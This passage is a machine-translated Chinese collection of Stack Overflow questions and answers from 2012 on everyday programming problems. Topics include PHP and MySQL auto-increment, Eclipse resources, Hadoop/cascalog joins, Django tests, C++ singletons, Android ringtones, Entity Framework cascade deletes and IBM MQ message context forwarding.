例如，Joe Bloggs 得到一个报价，报价参考编号 111 显示在屏幕上。

下次提交表单时，它将在屏幕上显示 112，依此类推。

实现这一目标的最佳代码是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:25:03.863

您应该真正考虑数据库中的自动增量 id 列。 [http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)

作为替代方案，您可以使用 php 将数字写入文件...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:28:00.490

PHP与MySQL 属性**无关。**`AUTO_INCREMENT`

只需应用于`AUTO_INCREMENT`您想要的字段，在插入数据时，将数据插入除字段之外的每个`AUTO_INCREMENT`字段。MySQL 会自动为您执行此操作。

要显示您的`AUTO_INCREMENT`字段的最新编号 - 使用[`mysql_insert_id()`](http://php.net/manual/en/function.mysql-insert-id.php)或查看[此文章](http://zenverse.net/php-mysql-next-auto-increment-value/)。

# java - 如何在 Eclipse 中将图像添加到项目目录中？

> ID：11396690
> 
> 赞同：0
> 
> 时间：2012-07-09T14:06:52.227
> 
> 标签：java, eclipse, image, jar, directory

我有一个程序可以运行并且不会在 Eclipse 中引发运行时错误，结果应该在程序结束时将图像设置为 JButton，但图像永远不会放在按钮上。该程序在 DrJava 中运行良好，但我转移到 eclipse 以制作 jar 文件。

我在另一个发布的问题中看到有人有类似的问题，说图像应该放入项目目录而不是 src 目录，但它没有解释如何实际解决问题......我是 eclipse 新手，所以如果有人可以帮助我谢谢。

这是在我的代码中设置图像的方式：

```
public void tempSelection70 (int fRate, int wbTemp, int rcTons, int a, int r)
  {
    for (int model = 0; model < 7; model++)
    {
      MyArray y = new MyArray(tons70FCharts[model], "t");
      int[][] x = y.getArray();
      int t = x[a][r];
      if (rcTons == t)
      {
        tableButton = new JButton(new ImageIcon(tablesFor70[model], tablesFor70[model]));
        break;
      }
      else 
      {
        tableButton = new JButton(new ImageIcon("CANNOT_FIND_MODEL.GIF", "SCROLL"));
      }
    }
    for (int model = 0; model < 7; model++)
    {
      MyArray y = new MyArray(flow70FCharts[model], "f");
      int[][] x = y.getArray();
      int t = x[a][r];
      if (fRate == t)
      {
        tableButton = new JButton(new ImageIcon(tablesFor70[model], tablesFor70[model]));
        break;
      }
      else 
      {
        tableButton = new JButton(new ImageIcon("CANNOT_FIND_MODEL.GIF", "SCROLL"));
      }
    }
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:25:05.267

您将文件名作为参数传递。我猜这个文件名是一个相对文件名。因此，该文件相对于 IDE 启动`java`命令以执行应用程序的目录：工作目录。

可以从 Eclipse 中的“参数”选项卡下的运行配置更改此目录。但这可能不是你想要的。图标当然应该与您的应用程序捆绑在一起，并使用类加载器加载。将它们放在源文件夹中的一个包下。Eclipse 会将它们与编译的类一起复制到输出目录。如果您为您的应用程序生成一个 jhar，它们将与您的类捆绑在 jar 中。完成此操作后，您只需使用将 URL 作为参数的构造函数，然后传递

```
SomeClassOfYourApp.getResource("/the/package/of/the/image.png") 
```

作为这个 URL 参数。

这将允许您轻松地将图标与应用程序捆绑在一起，并且无论工作目录是什么都将加载图标。

# java - 使用 Hadoop 连接两个需要两个 map 和一个 reduce 的数据集

> ID：11396695
> 
> 赞同：1
> 
> 时间：2012-07-09T14:07:21.957
> 
> 标签：java, hadoop, mapreduce

> **可能重复：**
> [相当于 mongo 的 out:reduce 选项在 hadoop](https://stackoverflow.com/questions/11399140/equivalent-of-mongos-outreduce-option-in-hadoop)

我有 2 个数据集，一个是另一个的补充。它看起来像这样（不是实际字段）：

```
Question
========
id(key)
name
description

Answer
========
id(key)
type
question_id

Output
======
question_id (key)
name
description
type_a_count
type_b_count 
```

我想知道每个问题有多少特定类型的答案。我曾经使用 mongodb 的 map reduce 引擎来执行此操作，方法是发出我的问题映射器的相同字段（但归零），除了 type_count 字段中的一个，然后将所有内容添加到我的 reducer 中。**我现在遇到的问题是，当我运行答案映射器时，我的问题映射器中的值被答案映射器中的值覆盖。**

**我正在寻找相当于 mongodb 的 {out: "reduce"} 选项。**

## 更多细节：

*   我只为我的问题映射器使用映射器
*   两个作业的 outputURI 是相同的，因为我希望它合并
*   我想使用问题映射器的输出和答案映射器的输出作为我的减速器的输入

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:54:56.590

这个答案可能符合您的喜好，也可能不符合您的喜好。我知道您标记了 java，但是有一个名为 cascalog 的库（用 clojure 编写）可用于编写 hadoop 查询。这很简单：

```
$ lein repl
REPL started; server listening on localhost port 16309
myapp=> (use 'cascalog.playground)
nil
myapp=> (bootstrap)
nil
myapp=> (def questions [["1" "what?" "desc what"] ["2" "where?" "Desc where"]])
#'myapp/questions
myapp=> (def answers [["1" "a" "1"]["2" "a" "1"]["3" "a" "1"]["4" "b" "2"]])
#'myapp/answers
myapp=> (?<- (stdout) [?type ?name ?desc ?count] (questions ?qid ?name ?desc) (answers ?aid ?type ?qid) (c/count ?count))

RESULTS
-----------------------
a       what?   desc what   3
b       where?  Desc where  1 
```

以下是了解 cascalog 的良好起点：http: [//nathanmarz.com/blog/introducing-cascalog-a-clojure-based-query-language-for-hado.html](http://nathanmarz.com/blog/introducing-cascalog-a-clojure-based-query-language-for-hado.html)。

# iphone - 解析多个 XML Web 文件 iphone

> ID：11396699
> 
> 赞同：1
> 
> 时间：2012-07-09T14:07:30.470
> 
> 标签：iphone, objective-c, xml-parsing

假设我有一个带有名为标签的 xml 文件，其中包含我想在我的 tableView 中显示的字段数，在另一个 xml 文件中我有要在该 tableView 中显示的信息。

问题是：我应该在我的项目中创建 2 个不同的文件（xmlparse1.h 和 .m + xmlparse2.h 和 .m）还是应该将所有代码放入 1（xmlparse.h + .m）并区分哪个文件我现在正在用代码中的 bool 或类似的东西进行解析？

如果这可能会改变，我正在 Xcode 4.3 mac os x 10.7.4 上开发一个 iphone 应用程序

编辑：第一个文件：

```
<MenuPrin>
<humidite>82,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</humidite>
<tempmoy>
189,124,700,700,700,700,700,700,700,700,700,700,700,700,700,700,700,700,700,700
</tempmoy>
</MenuPrin> 
```

第二个文件：

```
<Instal>
<nbrField>2</nbrField>
</Instal> 
```

所以它看起来像这样。因此，由于 nbrField 为 2，我将从 tempMoy 和 humanite 中获取第 2 个值并将它们显示在 tableView 中。

编辑结束

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:16:36.323

如果您在两种情况下的解析方式相似，那么添加两组有效地执行相同操作的文件将是非常低效的，并且被认为是不好的做法。创建一个可以处理两个不同文件的解析器比编写两个只能处理一个特定文件的解析器更有意义。

为了更具体地回答您的问题，我将确定您正在解析哪个文件并做出相应的行为，无论您是使用 bool 还是其他什么都取决于您。

**编辑：**这是我脑海中突然出现的想法，因此，如果出于某种原因这对您不起作用（就像我说的已经有一段时间了），或者有人有更好的想法，我会全力以赴。您仍然可以拥有一组包含解析器定义的文件（.h 和 .m）。您的解析器可以在其中包含两个类型为 Object1 和 Object2 的变量，它们的构建方式类似于您需要存储您为第一种类型的文件解析一次的数据结构，并为您的第二种类型的文件存储不同的定义文件类型。这样，当您确定您正在读取哪个文件后进行解析时，它只会更改您写入的这两个对象中的哪一个。您如何设置它也有很多变化，我还可以考虑一些您可能尝试做的事情，而这可能不起作用，

If you think that the two sets of files approach is better for the application you are trying to write and makes more sense to you, given what has been discussed in the comments, it isn't necessarily a bad idea.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:16:27.707

如果您想在一个视图中创建两个表视图，则需要创建一个 .h 和 .m 文件...如果您想创建单独的表视图，您需要创建两个 .h 和 .m ...

尝试 TBXML 解析器...这是 xmlparsing 最简单的方法和更少的内存使用...

# raphael - VML鼠标事件对象的结构是什么？

> ID：11396702
> 
> 赞同：0
> 
> 时间：2012-07-09T14:07:33.840
> 
> 标签：raphael, vml

我想知道 VML 鼠标事件对象的结构（属性和方法）。

我正在使用 Raphael，我想知道元素悬停时的鼠标坐标。在 Firefox 和 Chrome 上，`event.pageX`并且`event.pageY`正在运行，但在 IE8 中不可用。

```
var paper = Raphael(document.getElementById('map', 300, 300));
paper.circle(50, 50, 40).attr({fill: 'black'}).mouseover(function(event){
    alert(event.pageX);
}); 
```

这是[JSFiddle](http://jsfiddle.net/B3hFu/2/)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T15:26:06.143

事实上，它并不特定于 VML：所有鼠标事件在 IE 中都具有相同的结构。我使用了`clientX`and `clientY`，因为 clientX 是相对于视口的偏移量，而`pageX`相对于页面的偏移量。

# django - 未在 Django Selenium 测试中创建 auth_user 表

> ID：11396709
> 
> 赞同：1
> 
> 时间：2012-07-09T14:07:42.700
> 
> 标签：django, django-models, selenium, django-testing

我正在使用 django-selenium 来测试我的 Django 1.3 项目。问题是，测试在用户授权阶段失败，并出现错误**"No such table: auth_user"**。
不过，我可以在测试代码中创建用户。
有没有办法让 Django 创建用于身份验证的表，而不仅仅是来自 models.py 的表？
谢谢。

**升级版**。日志说 auth_user 表已创建，但错误仍然出现。

**UPD2**。此问题的解决方案是在设置中指定 TEST_NAME。转到[此处](http://timescapers.com/2011/08/27/django-nose-selenium-a-concise-tutorial/ "这里")了解详细信息（它是为*鼻子*编写的，但也适用于其他工具）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T23:44:50.530

此问题的解决方案是在设置中指定 TEST_NAME。转到[此处](http://timescapers.com/2011/08/27/django-nose-selenium-a-concise-tutorial/ "这里")了解详细信息（它是为鼻子编写的，但也适用于其他工具）。

# php - 使用explode将php字符串转换为数组，需要帮助在javascript中操作

> ID：11396714
> 
> 赞同：0
> 
> 时间：2012-07-09T14:08:06.157
> 
> 标签：php, javascript, ajax, arrays

我正在将 php 中的数组（使用爆炸从字符串转换）发送到单独的 javascript 页面。我想知道如何进入 javascript 数组并实际检索数据值。

javascript中的数组（来自php文件）-

```
array(2) {
  [0]=>
  string(2) "30"
  [1]=>
  string(0) ""
}
array(2) {
  [0]=>
  string(2) "30"
  [1]=>
  string(0) ""
} 
```

这是javascript页面上的ajax调用-

```
$.ajax({
    url: "GetTest.php",
    type: "POST",
    success: function(data){
     alert("success");
     console.log(data);  
    },
    error: function(data){
     alert('failure'); 
    }
}); 
```

在php页面上-

```
var_dump((explode(',', $something)); 
```

我如何进入这里并取出“30”值。我正在使用 ajax 调用来获取这些数据，然后将这个数组放在一个名为“data”的变量中，但是如果我执行类似 data[0] 的操作，我会得到字母“a”作为响应。对此的任何帮助将不胜感激。谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:13:08.447

如果您返回数组本身，它不会被转换为 JavaScript 对象。我相信你只会得到字符串“Array”。您需要做的是调用`json_encode($your_array)`将数组转换为 JavaScript 对象。然后，PHP 将返回一个如下所示的 JavaScript 对象：

```
{
  "0": "30",
  "1": ""
} 
```

然后，您可以在响应上调用 JSON.parse 并像访问任何其他 JavaScript 对象一样访问该对象中的数据。

**注意：**如果您使用的是 PHP < 5.2 并且没有安装 JSON PECL 扩展，则该`json_encode()`函数将不可用，您将需要编写一个将数组转换为 JSON 的函数或查找其他人编写的函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:12:42.993

JavaScript 数组应如下所示...

```
var myArray = ["30", "0"]; 
```

如果您在索引 0 处获得“a”，则您可能有一个字符串而不是数组。

```
"array"[0] === "a" 
```

所以你需要先修复你的客户端阵列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:15:37.700

在纯 JavaScript 中：

```
xhr.onreadystatechange = function()//where xhr is your request object
{
    if (this.readyState === 4 && this.status === 200)
    {
        var yourArray = JSON.parse(this.responseText);
        console.log(yourArray);//logs the array above, normally
    }
}; 
```

请注意，至少在 9 之前的 IE 不标配 JSON 支持，在这种情况下，只需 google JSON.js 并将其包含在标头中即可。
还要确保您发送的数组`json_encode`在回显之前是 'ed。

查看您添加的代码，我会说：替换 var_dump`echo json_encode(explode(',',$someString));`就可以了

# python - 是否有 Python 到空白语言转换器？

> ID：11396717
> 
> 赞同：4
> 
> 时间：2012-07-09T14:08:30.993
> 
> 标签：python

我很难找到一个，因为“空白”是一个常用词，但我很好奇这是否可以做到。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:44:47.140

据我所知，没有这样的程序，但是有一些用 Python 编写的 Whitespace 工具：

*   [空白汇编器](http://code.activestate.com/recipes/577108-whitespace-assembler/)
*   [空白助手](http://code.activestate.com/recipes/577109-whitespace-helpers/)
*   [空白解释器](http://code.activestate.com/recipes/577110-whitespace-interpreter/)
*   [空白堆栈计算器](http://code.activestate.com/recipes/577112-whitespace-stack-calculator/)
*   [空白内存管理器](http://code.activestate.com/recipes/577673-whitespace-memory-manager/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T15:09:08.350

没有这样的东西——它需要整个 Python 语言在 Whitespace 中运行——这样你的 Python 程序就可以使用函数、列表和其他内置函数，更不用说标准库了。

这样的事情可以通过 Pypy 来实现——你可以编写一个 Whitespace 后端——我怀疑这种努力能否找到资金或支持。

然而，一个“单人破解”可能会改变 Python 字节码操作以仅使用空白字符。它不会是“空白兼容的”——但你最终会产生相同的效果：编译的 Python 文件——我们称为“pyc”的那些文件可能仅由代码的空白组成。（但不适用于数据和元数据标记），破解 Python 源代码树中的几个文件。

更改操作码本身很容易 - 它们位于 Python 源代码树的 Lib/opcode.py 文件中 - 但您必须更改解释器以使用多字节操作码（因为目前所有操作码都是一个字节+参数）。

# php - 代码有什么问题

> ID：11396718
> 
> 赞同：-1
> 
> 时间：2012-07-09T14:08:32.100
> 
> 标签：php

我对 php 很陌生。我正在读一本书，其中有一个关于 while 循环的例子：

```
<html>
<body>
<table border="0" cellpadding="3">
<tr>
<td bgcolor="#CCCCCC" align="center">Distance</td>
<td bgcolor="#CCCCCC" align="center">Cost</td>
</tr>
<?

  $distance = 50;
  while ($distance <= 250) {
  echo "<tr>
    <td align=\"right\">".$distance."</td>
    <td align=\"right\">".($distance / 10)."</td>
    </tr>\n";

  $distance += 50;
}

?>
</table>
</body>
</html> 
```

这是我在 Apache Web 服务器上运行此代码时的结果：

```
\n"; $distance += 50; } ?>
Distance     Cost
".$distance."   ".($distance / 10)." 
```

我不知道为什么`$distance`不打印的值。你能帮我修一下吗？非常感谢你！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:10:31.900

`<?php`用, not开始一个代码块`<?`。[不要使用短标签](https://stackoverflow.com/questions/200640/are-php-short-tags-acceptable-to-use)。

（如果您的书提供带有短标签的 PHP 示例，以及带有 HTML 示例的示例，`bgcolor`那么我建议您获取一个更新的示例）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:12:50.570

尝试使用

```
<?php ?> 
```

而不是

```
<? ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T14:15:11.020

首先，php代码应该以“ `<?php`”开头，请将“”替换为“ `<?`” `<?php`。然后，该文件应保存为“.php”文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T14:17:48.180

在 HTML-Context 中（即您正在编写一个 html 页面）时，使用模板样式更清楚：

```
<html>
    <body>
        <table border="0" cellpadding="3">
            <tr>
                <td bgcolor="#CCCCCC" align="center">Distance</td>
                <td bgcolor="#CCCCCC" align="center">Cost</td>
            </tr>
            <?php for($distance = 50; $distance <= 250; $distance += 50): ?>
            <tr>
                <td align="right"><?php echo $distance ?></td>
                <td align="right"><?php echo $distance / 10 ?></td>
            </tr>
            <?php endfor ?>
        </table>
    </body>
</html> 
```

这也与 Dreamweaver 等所见即所得编辑器兼容。

# c++ - accesing a class variable in other class function C++

> ID：11396722
> 
> 赞同：-3
> 
> 时间：2012-07-09T14:08:34.793
> 
> 标签：c++, class

i have a variable map dataa ehich is used in three different class.i can define this variable globally and put all classes defination in one cpp file but i want to make different files for three different class and thus cant define it globally.

now i want to define this variable in one class say A and then want to use this dataa in the rest two class say B and C.

how can i do this.thanks for anyhelp in advance

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:12:02.960

您可以使用公共 get 和 set 方法来访问 A 类中的变量。或者只是在 A 类中创建一个公共变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:13:37.217

或者，您可以尝试将此变量映射数据作为新单例类的一部分。其余 3 个不同的类可以使用 get 方法访问这个单例类

文件：singleton.h

```
#include <iostream>
using namespace std;

class singletonClass
{
  public:
      singletonClass(){};
      ~singletonClass(){};

  //prevent copying and assignment
  singletonClass(singletonClass const &);
  void operator=(singletonClass const &);

  //use this to get instance of this class
  static singletonClass* getInstance()
  {
     if (NULL == m_Singleton)  //if this is the first time, new it!
        m_Singleton = new singletonClass;

     return m_Singleton;
  }

  int getData()
  {
     return data;
  }

  void setData(int input)
  {
      data = input;
  }
  private:
    static singletonClass* m_Singleton;  //ensure a single copy of this pointer
    int data;
 };
 //declare static variable as NULL
singletonClass* singletonClass::m_Singleton = NULL; 
```

文件：ClassA.h

```
class ClassA
{
  public:
      ClassA(){};
      ~ClassA(){};

     int getVarFromSingleton()
     {
          m_Singleton = singletonClass::getInstance();  //get a pointer to the singletonClass
          return data = m_Singleton->getData();  //get data from singleton class and return this value
     }
  private:
     singletonClass* m_Singleton;  //declare a pointer to singletonClass
     int data;
 }; 
```

文件：main.cpp

```
int main()
{
singletonClass* DataInstance;
ClassA a;
int data;

DataInstance = singletonClass::getInstance();

DataInstance->setData(5);

data = a.getVarFromSingleton();

cout << "shared data: " << data << endl;

return 0; 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:55:44.103

你可以用**朋友**

```
class A
{
friend class B;
friend class C;
private:
int m_privateMember;
};

class B {
};

class C {
}; 
```

现在，B 和 C 可以访问 A 的私有成员。

但这不是最好的方法。尽量避免它。

# java - Android Saving Sound as Ringtone - Title not being used in Ringtone List

> ID：11396725
> 
> 赞同：1
> 
> 时间：2012-07-09T14:08:40.277
> 
> 标签：java, android, audio, notifications, ringtone

In my code I'm setting a sound file as a ringtone. It mostly works fine.

This issue is that it doesn't use the ContentValue's TITLE entry for the Ringtone name in the ringtone list. In the following code, I set the TITLE key to "Custom Name". But in the ringtone selection list it insists on showing up as "testTone" (The filename is "testTone.mp3").

```
// Take the given file and add it to the ringtone list
private Uri makeRingtone(File soundFile) {
  String path = soundFile.getAbsolutePath();

  // Make sure the system knows about it
  sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE,
          Uri.parse("file://"+path)));

  // Plug in same important values
  ContentValues values = new ContentValues();  
  values.put(MediaStore.MediaColumns.DATA, path);  
  values.put(MediaStore.MediaColumns.TITLE, "Custom Name");
  values.put(MediaStore.MediaColumns.MIME_TYPE, "audio/*"); 
  values.put(MediaStore.Audio.Media.IS_RINGTONE, true);  
  values.put(MediaStore.Audio.Media.IS_NOTIFICATION, true);  
  values.put(MediaStore.Audio.Media.IS_ALARM, true);  
  values.put(MediaStore.Audio.Media.IS_MUSIC, false);

  // The ol' delete then insert trick:
  Uri uri = MediaStore.Audio.Media.getContentUriForPath(path);
  getContentResolver().delete(uri, MediaStore.MediaColumns.DATA + "=\"" + path + "\"", null);
  Uri newUri = getContentResolver().insert(uri, values);

  Log.d(TAG, "New Uri: " + newUri);

  return newUri;
} 
```

This is similar to the issue: [Saving sounds as ringtones using the title of the sound instead of number location](https://stackoverflow.com/q/8172539/1512137)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-03T13:56:43.653

删除此行，铃声将显示正确的标题：

```
sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE,
      Uri.parse("file://"+path))); 
```

# entity-framework - 为什么 EF 级联删除不适用于 0 对 1 关系？

> ID：11396726
> 
> 赞同：0
> 
> 时间：2012-07-09T14:08:43.340
> 
> 标签：entity-framework, code-first

我通过代码优先定义了下表：

```
public class Action 
{
    public int ActionId { get; set; }

    public int? EmailMessageId { get; set; }
    public virtual EmailMessage EmailMessage { get; set; }
}

public class EmailMessage
{
    public int EmailMessageId { get; set; }

    public string Content { get;set;
} 
```

当使用相应的 EmailMessage 创建操作时，删除操作不会删除 EmailMessage 中的条目。似乎 EF 仅在 1-many 关系上创建级联删除。在这种情况下，关系是 0 或 1 关系，默认情况下没有设置级联删除。

然后我添加了流畅的配置：

```
modelBuilder
  .Entity<Action>()
  .HasOptional(x =>x.EmailMessage)
  .WithMany()
  .HasForeignKey(x=>x.EmailMessageId)
  .WillCascadeOnDelete(true); 
```

在 Management Studio 中查看架构时，这似乎正确设置了 CASCADE DELETE。但是，当我从数据库中手动删除 Action 中的行时，EmailMessage 中的行仍然存在。

我在这里到底做错了什么？当我在配置中使用“WithOptionalDependent()”时，我想我可能会到达某个地方。但是，当我查看架构时，它已经引入了“EmailMessage_EmailMessageId”，而我的表中已经有 EmailMessageId？

谁能告诉我这里有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:25:20.660

级联删除旨在在删除*父*级时删除*子*级，而不是相反。在这种情况下，Action 是与 EmailMessage 父级的外键关联的子级。所以删除Action不会影响EmailMessage，但是删除EmailMessage应该级联删除到Action。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-10T22:40:31.503

我刚刚意识到使用“contextName.Entry(parentStudySession).State = System.Data.Entity.EntityState.Deleted;” 删除一些有几个孩子的父母..我谈论的是 EF 6.3，EF 不会为我们删除孩子，甚至没有删除父母本身，即使我们有级联删除约束。相反，它会给出错误“操作失败：无法更改关系，因为一个或多个外键属性不可为空。当对关系进行更改时，相关的外键属性设置为一个空值。如果外键不..."

相反，当我使用“contextName.StudySession.Remove(parentStudySession);”时 , EF 6.3 成功删除了 PARENT 和 CHILDREN ...我有级联删除约束。 *T·阿达科格鲁**

# xml - 迭代访问父节点时在Groovy中按名称访问xml的子节点

> ID：11396730
> 
> 赞同：2
> 
> 时间：2012-07-09T14:09:15.133
> 
> 标签：xml, groovy, soapui

我有一个这样的 XML：

```
<Envelope>
 <Node>
    <Status>1</Status>
    <Name1>John</Name1>
    <Name2>Smith</Name2>
 </Node>
 <Node>
    <Status>2</Status>
    <Name1>Jane</Name1>
    <Name2>Doe</Name2>
 </Node>
</Envelope> 
```

我想遍历每个节点，如果 Status 的值为 1，则使用 Name1，如果为 2，则使用 Name2。

```
Envelope = holder.getNodeValues("//ns2:NonProvisionedServers")
for(node in Envelope)
if(node.Status == 1)
{
    assert node.Name1 == "SomeFirstName"
}
if(node.Status == 2)
{
    assert node.Name2 == "SomeLastName"
} 
```

我以前做过最少的 Groovy 脚本。我看过相关的帖子，但它们只遍历子节点，我不想这样做，因为我的父节点有很多子节点，而且我有很多父节点要经过。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:14:45.137

你可以这样做：

```
def inx = '''<Envelope>
            |  <Node>
            |    <Status>1</Status>
            |    <Name1>John</Name1>
            |    <Name2>Smith</Name2>
            |  </Node>
            |  <Node>
            |    <Status>2</Status>
            |    <Name1>Jane</Name1>
            |    <Name2>Doe</Name2>
            |  </Node>
            |</Envelope>'''.stripMargin()

// Parse the XML
def xml = new XmlSlurper().parseText( inx )

// For every <Node> element in the XML
xml.Node.each { node ->

  // Print the child of the node called "Name" + Status
  println node."Name${node.Status}"
} 
```

打印：

```
John
Doe 
```

# java - 是否可以更改传出 MQMessage 的 PutApplicationType？

> ID：11396731
> 
> 赞同：2
> 
> 时间：2012-07-09T14:09:19.300
> 
> 标签：java, .net, ibm-mq

我有用于 MQ 消息的消息转发器/路由器之类的东西。我正在尝试根据一些规则转发消息。这种转发只是通过从一个队列接收消息、创建一条新消息（具有相同或修改的内容）并将其放入另一个队列来完成。转发器的存在应该尽可能透明。

目前我的问题是`PutApplicationType`消息属性。看来我无法更改此属性。我有 .NET 和 Java 示例实现，我试图简单地使用：

```
MQMessage forwardedMessage = new MQMessage();
forwardedMessage.putApplicationType = CMQC.MQAT_UNIX; 
```

我尝试使用什么值并不重要。.NET 版本总是使用`MQAT_DEFAULT`/发送消息，`MQAT_WINDOWS_NT`而 Java 版本总是使用`MQAT_JAVA`.

是否可以更改此标题？如果不是，如果我不更改值，是否会对遗留系统造成一些问题？为什么无法更改值？

顺便提一句。转发原始消息也不起作用 - 我的应用程序也会更改`PutApplicationType`属性。

编辑：如果我使用本机 C API，我可以控制这个属性的内容吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T18:38:00.730

正如 T.Rob 所说，您需要阅读手册（WMQ Using Java 或 WMQ Using .Net）。转发消息不是您上面列出的简单任务。有几个选项/参数需要正确设置。

这是一个删除所有异常处理的 Java 代码片段：

```
int openInputOptions  = MQC.MQOO_INQUIRE + MQC.MQOO_FAIL_IF_QUIESCING + MQC.MQOO_INPUT_SHARED + MQC.MQOO_SAVE_ALL_CONTEXT;
int openOutputOptions = MQC.MQOO_OUTPUT + MQC.MQOO_FAIL_IF_QUIESCING + MQC.MQOO_PASS_ALL_CONTEXT;

MQQueue _inQ = _qMgr.accessQueue( inQueueName, openInputOptions, null, null, null );

MQQueue _outQ = _qMgr.accessQueue( outputQueueName, openOutputOptions, null, null, null );

MQGetMessageOptions getOptions = new MQGetMessageOptions();
getOptions.options = MQC.MQGMO_NO_WAIT + MQC.MQGMO_FAIL_IF_QUIESCING;

MQMessage mqMsg = new MQMessage();

mqMsg.correlationId = MQC.MQCI_NONE;
mqMsg.messageId = MQC.MQMI_NONE;

_inQ.get(mqMsg, getOptions);

MQPutMessageOptions pmo = new MQPutMessageOptions();
pmo.options =  MQC.MQPMO_FAIL_IF_QUIESCING + MQC.MQPMO_PASS_ALL_CONTEXT;
pmo.contextReference = _inQ;

_outQ.put(mqMsg, pmo); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:48:18.647

有两种方法可以做到这一点，具体取决于您希望的安全程度。第一种也是更安全的方法是从原始消息中传递上下文。此方法保留上下文，而不允许程序更改任何内容。这是通过`MQOO_SAVE_ALL_CONTEXT`打开队列获取消息和`MQOO_PASS_ALL_CONTEXT`放置消息的队列来实现的。

另一种选择是直接设置上下文。这不太安全，因为应用程序可以将字段设置为任意值。如果使用消息的应用程序依赖上下文进行授权，这允许上游应用程序绕过该授权。有几个选项，具体取决于应用程序需要访问的上下文信息集。

请参阅知识中心中的[控制消息上下文信息](https://www.ibm.com/support/knowledgecenter/SSFKSJ_9.1.0/com.ibm.mq.dev.doc/q026170_.htm)。

所有这些都绝对适用于 C 实现。我不知道 .Net 实现中暴露了多少。也许Shashi 会在单独的回复中填写该详细信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-10T10:04:33.887

是的，MQ .NET 还支持所有这些与上下文相关的属性。

这是我的 .NET 应用程序版本，它转发具有由原始发送应用程序设置的相同应用程序类型的消息。

使用 MQOO_SET_ALL_CONTEXT 因为我将消息放在同一个应用程序中

```
 MQQueue recvQ = qm.AccessQueue("Q1", MQC.MQOO_INPUT_SHARED | MQC.MQOO_OUTPUT | MQC.MQOO_SET_ALL_CONTEXT | MQC.MQOO_SAVE_ALL_CONTEXT | MQC.MQOO_FAIL_IF_QUIESCING);
            MQQueue fwdQ = qm.AccessQueue("Q2", MQC.MQOO_OUTPUT | MQC.MQOO_PASS_ALL_CONTEXT | MQC.MQOO_FAIL_IF_QUIESCING);

            MQMessage putMsg = new MQMessage();
            putMsg.WriteString("Verify PutApplicationType");
            putMsg.Persistence = MQC.MQPER_NOT_PERSISTENT;

            putMsg.PutApplicationType = MQC.MQAT_UNIX;
            putMsg.PutApplicationName = "UnixApplication";
            putMsg.Format = MQC.MQFMT_STRING;

            MQPutMessageOptions pmo = new MQPutMessageOptions();
            pmo.Options = MQC.MQPMO_SET_ALL_CONTEXT;
            recvQ.Put(putMsg,pmo);

            MQGetMessageOptions gmo = new MQGetMessageOptions();
            gmo.WaitInterval = MQC.MQWI_UNLIMITED;
            gmo.Options = MQC.MQGMO_WAIT;
            MQMessage fwdMsg = new MQMessage();
            recvQ.Get(fwdMsg, gmo);

            MQPutMessageOptions pmoF = new MQPutMessageOptions();
            pmoF.Options = MQC.MQPMO_FAIL_IF_QUIESCING + MQC.MQPMO_PASS_ALL_CONTEXT;
            pmoF.ContextReference = recvQ;
            fwdQ.Put(fwdMsg, pmoF);

            recvQ.Close();
            fwdQ.Close(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-10T15:21:22.653

> 这适用于转发，但它引发了许多与并行处理相关的新问题 - 是否可以从同一个 MQQueue 实例并行处理多个消息？

当然，我编写的应用程序始终具有并行运行的线程。确保每个线程都有自己到队列管理器的连接。

> 我猜它只能保存最后收到的消息的上下文。

真的。（对于那个特定的线程）

> 如果我可以简单地设置 PutApplicationType 字段，它也不能回答我的主要问题——它可能与@T.Rob 提到的创建新上下文有关。

您可能应该参加 MQ 课程，因为您没有阅读 T.Rob 给您的手册页。如果您阅读了这些页面（和小节），那么您会了解到 MQMD 有 7 个字段不能简单地设置并由队列管理器控制。

队列管理器控件：

1.  身份背景：

    *   用户身份
    *   会计令牌
    *   应用程序 ID
2.  起源背景：

    *   PutApplType
    *   PutApplName
    *   放置日期
    *   放置时间

您可以“设置”或“通过”身份上下文，也可以“设置全部”或“全部通过”原始上下文。如果您想更改 MQMD 的 PutApplType 字段（它是原始上下文的一部分），那么您必须使用“设置所有”上下文并且您必须设置 MQMD 的所有 7 个上下文字段，因为队列管理器不会设置它们。

